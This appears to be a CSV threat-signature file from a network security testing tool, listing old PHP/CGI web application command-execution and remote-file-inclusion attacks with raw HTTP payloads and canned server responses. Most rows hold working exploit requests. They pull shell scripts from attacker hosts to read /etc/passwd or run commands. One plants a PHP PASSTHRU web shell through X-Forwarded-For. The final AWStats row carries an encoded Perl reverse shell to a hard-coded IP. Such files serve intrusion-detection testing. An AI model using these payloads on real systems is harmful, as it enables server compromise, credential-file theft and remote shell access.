XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
aardvarktopsites_cmi_b.xml,Aardvark Topsites PHP 4.2.2 Remote Command Execution,This threat leverages an arbitrary file inclusion flaw into a remote command execution flaw through a flaw in  the lostpw.php script. Aardvark Topsites is a web application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿aardvarktopsites_cmi_b_IPv6.xml,Aardvark Topsites PHP 4.2.2 Remote Command Execution (IPv6 Version),This threat leverages an arbitrary file inclusion flaw into a remote command execution flaw through a flaw in  the lostpw.php script. Aardvark Topsites is a web application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /sources/lostpw.php?FORM[set]=1&FORM[session_id]=1&CONFIG[path]=http://www/attacker.com/shell.php?cmd=%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F%3B%20cat%20%2Fetc%2Fpasswd%3B%20%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: www.google.com[[0D 0A ]]User-Agent: Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101[[0D 0A 0D 0A 0D 0A]]"
aardvarktopsites_cmi_b_IPv6.xml,Aardvark Topsites PHP 4.2.2 Remote Command Execution (IPv6 Version),This threat leverages an arbitrary file inclusion flaw into a remote command execution flaw through a flaw in  the lostpw.php script. Aardvark Topsites is a web application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿acal_cmi.xml,ACal 2.2.6  Arbitrary Command Execution,"This threat sends a crafted HTTP GET query which includes an arbitrary remote file containing PHP code which is executed by the server via the day.php ""path"" parameter. ACal is a web based application with typically listens on port 80.",HTTP,TCP,"GET //ACal/embed/day.php?path=http://www.attacker.com/cmd.gif?cmd=ls HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
acal_cmi.xml,ACal 2.2.6  Arbitrary Command Execution,"This threat sends a crafted HTTP GET query which includes an arbitrary remote file containing PHP code which is executed by the server via the day.php ""path"" parameter. ACal is a web based application with typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿acal_cmi_IPv6.xml,ACal 2.2.6  Arbitrary Command Execution (IPv6 Version),"This threat sends a crafted HTTP GET query which includes an arbitrary remote file containing PHP code which is executed by the server via the day.php ""path"" parameter. ACal is a web based application with typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"GET //ACal/embed/day.php?path=http://www.attacker.com/cmd.gif?cmd=ls HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
acal_cmi_IPv6.xml,ACal 2.2.6  Arbitrary Command Execution (IPv6 Version),"This threat sends a crafted HTTP GET query which includes an arbitrary remote file containing PHP code which is executed by the server via the day.php ""path"" parameter. ACal is a web based application with typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿admbook_cmi.xml,Admbook Arbitrary Command Execution Vulnerability,This threat sends a crafted POST command with a modified X-Forwarded-For field containing PHP code which is executed by the server. Admbook is a web application that typically listens on port 80.,HTTP,TCP,"POST /admbook/write.php HTTP/1.1[[0D 0A ]]Referer: http://www.stonedcoder.org/admbook/index.php[[0D 0A ]]X-Forwarded-For: GUESS_WHAT:"";if (isset($_GET[CMD])){ECHO""Hi .Master!"";INI_SET(""max_execution_time"",0);PASSTHRU($_GET[CMD]);DIE;}echo""[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A ]]User-Agent: sun-tzu[[0D 0A ]]Content-Length: 89[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: Close[[0D 0A 0D 0A ]]page=1&name=whoami&url=&email=whoami@SUNTZU.COM&icq=&message=I%20love%20italian%20guys%21[[0D 0A 0D 0A]]"
admbook_cmi.xml,Admbook Arbitrary Command Execution Vulnerability,This threat sends a crafted POST command with a modified X-Forwarded-For field containing PHP code which is executed by the server. Admbook is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿admbook_cmi_IPv6.xml,Admbook Arbitrary Command Execution Vulnerability (IPv6 Version),This threat sends a crafted POST command with a modified X-Forwarded-For field containing PHP code which is executed by the server. Admbook is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"POST /admbook/write.php HTTP/1.1[[0D 0A ]]Referer: http://www.stonedcoder.org/admbook/index.php[[0D 0A ]]X-Forwarded-For: GUESS_WHAT:"";if (isset($_GET[CMD])){ECHO""Hi .Master!"";INI_SET(""max_execution_time"",0);PASSTHRU($_GET[CMD]);DIE;}echo""[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A ]]User-Agent: sun-tzu[[0D 0A ]]Content-Length: 89[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: Close[[0D 0A 0D 0A ]]page=1&name=whoami&url=&email=whoami@SUNTZU.COM&icq=&message=I%20love%20italian%20guys%21[[0D 0A 0D 0A]]"
admbook_cmi_IPv6.xml,Admbook Arbitrary Command Execution Vulnerability (IPv6 Version),This threat sends a crafted POST command with a modified X-Forwarded-For field containing PHP code which is executed by the server. Admbook is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿albinator_cmi.xml,Albinator Multiple Remote File Include Vulnerabilities,This threat uses a crafted HTTP GET command  with a modified Config_rootdir to include arbitrary code from a local or remote path. Albinator is a web application that typically listens on port 80.,HTTP,TCP,"GET /eshow.php?Config_rootdir=http://www.atacker.com/cmd.php?&cmd=cat%20/etc/passwd HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: www.exampl.com[[0D 0A ]]User-Agent: libwww-perl/5.803[[0D 0A 0D 0A]]"
albinator_cmi.xml,Albinator Multiple Remote File Include Vulnerabilities,This threat uses a crafted HTTP GET command  with a modified Config_rootdir to include arbitrary code from a local or remote path. Albinator is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿albinator_cmi_IPv6.xml,Albinator Multiple Remote File Include Vulnerabilities (IPv6 Version),This threat uses a crafted HTTP GET command  with a modified Config_rootdir to include arbitrary code from a local or remote path. Albinator is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /eshow.php?Config_rootdir=http://www.atacker.com/cmd.php?&cmd=cat%20/etc/passwd HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: www.exampl.com[[0D 0A ]]User-Agent: libwww-perl/5.803[[0D 0A 0D 0A]]"
albinator_cmi_IPv6.xml,Albinator Multiple Remote File Include Vulnerabilities (IPv6 Version),This threat uses a crafted HTTP GET command  with a modified Config_rootdir to include arbitrary code from a local or remote path. Albinator is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿angelinecms_cmi.xml,AngelineCMS 0.8.1 installpath argument Remote File Inclusion Exploit,This threat sends a standard HTTP query which uses an arbitrary host/path to insert PHP code which is executed by the server. AngelineCMS typically listens on port 80.,HTTP,TCP,"GET /kernel/loadkernel.php?installPath=http://www.hacker.net/cmd.txt?&cmd=dir HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: www.google.com[[0D 0A ]]User-Agent: libwww-perl/5.803[[0D 0A 0D 0A]]"
angelinecms_cmi.xml,AngelineCMS 0.8.1 installpath argument Remote File Inclusion Exploit,This threat sends a standard HTTP query which uses an arbitrary host/path to insert PHP code which is executed by the server. AngelineCMS typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿angelinecms_cmi_IPv6.xml,AngelineCMS 0.8.1 installpath argument Remote File Inclusion Exploit (IPv6 Version),This threat sends a standard HTTP query which uses an arbitrary host/path to insert PHP code which is executed by the server. AngelineCMS typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /kernel/loadkernel.php?installPath=http://www.hacker.net/cmd.txt?&cmd=dir HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: www.google.com[[0D 0A ]]User-Agent: libwww-perl/5.803[[0D 0A 0D 0A]]"
angelinecms_cmi_IPv6.xml,AngelineCMS 0.8.1 installpath argument Remote File Inclusion Exploit (IPv6 Version),This threat sends a standard HTTP query which uses an arbitrary host/path to insert PHP code which is executed by the server. AngelineCMS typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿awstats_cmi.xml,AWStats Referrer Arbitrary Command Execution Vulnerability,"This threat sends a crafted post command with a modified referrer field, this field is used directly and can be executed directly by the script. AWStats is a web application that  typically listens on port 80.",HTTP,TCP,"GET /cgi-bin/awstats.pl HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, Keep-Alive[[0D 0A ]]Host: www.example.com[[0D 0A ]]Referer: http://'.system($FilterEx{'refererpages'}).'[[0D 0A ]]User-Agent: libwww-perl/5.805[[0D 0A 0D 0A ]]GET /cgi-bin/awstats.pl?output=refererpages&update=1 HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, Keep-Alive[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: libwww-perl/5.805[[0D 0A 0D 0A ]]POST /cgi-bin/awstats.pl HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE,close[[0D 0A ]]Host: www.google.com[[0D 0A ]]User-Agent: libwww-perl/5.805[[0D 0A ]]Content-Length:   112[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A 0D 0A ]]output=refererpages&refererpagesfilterex=echo+1+%26%26+echo+_START_+%26%26+cat+%2Fetc%2Fpasswd+%26%26+echo+_END_[[0D 0A 0D 0A]]"
awstats_cmi.xml,AWStats Referrer Arbitrary Command Execution Vulnerability,"This threat sends a crafted post command with a modified referrer field, this field is used directly and can be executed directly by the script. AWStats is a web application that  typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿awstats_cmi_IPv6.xml,AWStats Referrer Arbitrary Command Execution Vulnerability (IPv6 Version),"This threat sends a crafted post command with a modified referrer field, this field is used directly and can be executed directly by the script. AWStats is a web application that  typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"GET /cgi-bin/awstats.pl HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, Keep-Alive[[0D 0A ]]Host: www.example.com[[0D 0A ]]Referer: http://'.system($FilterEx{'refererpages'}).'[[0D 0A ]]User-Agent: libwww-perl/5.805[[0D 0A 0D 0A ]]GET /cgi-bin/awstats.pl?output=refererpages&update=1 HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, Keep-Alive[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: libwww-perl/5.805[[0D 0A 0D 0A ]]POST /cgi-bin/awstats.pl HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE,close[[0D 0A ]]Host: www.google.com[[0D 0A ]]User-Agent: libwww-perl/5.805[[0D 0A ]]Content-Length:   112[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A 0D 0A ]]output=refererpages&refererpagesfilterex=echo+1+%26%26+echo+_START_+%26%26+cat+%2Fetc%2Fpasswd+%26%26+echo+_END_[[0D 0A 0D 0A]]"
awstats_cmi_IPv6.xml,AWStats Referrer Arbitrary Command Execution Vulnerability (IPv6 Version),"This threat sends a crafted post command with a modified referrer field, this field is used directly and can be executed directly by the script. AWStats is a web application that  typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿awstats_cmi_b.xml,AWStats 6.5  Remote Command Injection,"This threat sends a crafted HTTP POST command which allows arbitrary command execution via the ""migrate"" parameter. This is due to improper handling of shell metacharacters. AWStats is a web application with typically listens on port 80.",HTTP,TCP,"POST /awstats.pl HTTP/1.1[[0D 0A ]]Connection: close[[0D 0A ]]Host: www.google.com[[0D 0A ]]Accept-language: en-us[[0D 0A ]]Accept-encoding: deflate, gzip[[0D 0A ]]Cache-control: no-cache[[0D 0A ]]Referer: http://exploit.by.redsand.of.blacksecurity.org[[0D 0A ]]Content-type: application/x-www-form-urlencoded[[0D 0A ]]Content-length: 557[[0D 0A ]]Accept: text/xml,application/xml,application/xhtml+xml,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1[[0D 0A ]]User-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; [BL4CK] Security[[0D 0A 0D 0A 0D 0A ]]migrate=%7Ccd+%2Ftmp%2F+%26%26+perl+-e+%27%24h%3D%2264.14.244.60%22%3B%24p%3D%2731337%27%3Buse+Socket%3B%24sp%3Dinet_aton%28%24h%29%3B%24sa%3Dsockaddr_in%28%24p%2C%24sp%29%3B%3Bsocket%28CLIENT%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bgethostbyname%28%24h%29%3Bconnect%28CLIENT%2C%24sa%29%3Bopen%28STDIN%2C%22%3E%26CLIENT%22%29%3Bopen%28STDOUT%2C%22%3E%26CLIENT%22%29%3Bopen%28STDERR%2C%22%3E%26CLIENT%22%29%3Bif%28fork%28%29%29%7Bexec+%22%2Fbin%2Fsh%22%3B+exit%280%29%3B+%7D%3B%27%7Cawstats052005.www.google.com.txt&config=www.google.com"
